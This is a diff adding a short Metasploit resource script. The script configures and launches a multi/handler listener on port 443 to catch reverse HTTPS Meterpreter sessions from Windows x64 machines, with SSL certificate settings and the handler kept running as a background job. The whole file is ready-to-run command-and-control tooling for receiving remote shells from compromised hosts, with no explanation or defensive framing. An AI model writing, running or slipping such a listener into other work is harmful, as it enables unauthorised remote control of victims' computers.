@@ -1,0 +1,10 @@
+<ruby>
+print_status("Starting HTTPS listener for Windows x64 meterpreter on port 443.")
+run_single("use exploit/multi/handler")
+run_single("set payload windows/x64/meterpreter_reverse_https")
+run_single("set lport 443")
+run_single("set HandlerSSLCert MSF.pem")
+run_single("set ExitOnSession false")
+run_single("set StagerVerifySSLCert true")
+run_single("exploit -j")
+</ruby>
